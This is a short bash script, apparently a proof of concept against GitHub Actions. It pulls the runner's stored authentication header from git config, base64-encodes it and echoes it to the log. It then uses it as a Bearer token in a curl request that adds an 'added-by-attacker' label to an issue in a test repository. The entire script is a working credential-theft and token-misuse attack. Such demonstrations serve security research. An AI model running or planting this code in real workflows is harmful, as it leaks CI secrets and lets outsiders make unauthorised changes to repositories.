#!/bin/bash

GH=$(git config --get http.https://github.com/.extraheader | base64 | tr -d '\n')

echo $GH

curl --location --request POST 'https://api.github.com/repos/ndavison/actions-test/issues/31/labels' \
--header 'Accept: application/vnd.github.v3+json' \
--header "Authorization: Bearer $GH" \
--header 'Content-Type: application/json' \
--data-raw '{"labels": ["added-by-attacker"]}'
